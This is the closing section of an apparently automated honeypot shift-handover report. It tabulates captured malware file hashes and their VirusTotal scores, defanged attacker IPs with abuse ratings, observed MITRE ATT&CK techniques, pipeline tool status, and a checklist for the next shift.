| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `59.50.24[.]47` | CN | DongFang node Broad Band dialup pool | **100** ⚠️ | 1 |
| `101.126.23[.]159` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 7 |
| `183.56.216[.]153` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `194.187.176[.]86` | DE | Alpha Strike Labs GmbH | **100** ⚠️ | 50 |
| `120.48.113[.]47` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 29 |
| `14.103.123[.]50` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `101.96.199[.]38` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 1 |
| `58.229.141[.]26` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `103.234.53[.]69` | HK | 45 Des Voeux Road, Central | **100** ⚠️ | 5 |
| `206.42.14[.]196` | BR | Brisanet Prestacao De Servicos De Internet Ltda | **100** ⚠️ | 36 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 334 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 145 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 124 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 65 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 65 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 338 cases |
| Tool 34  | Credential Extractor        | ✅ 269 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (0.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 124 priority case(s) shown individually · 23 recon entry/entries in table (12 group(s) consolidating 202 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-17T09:23:45Z_
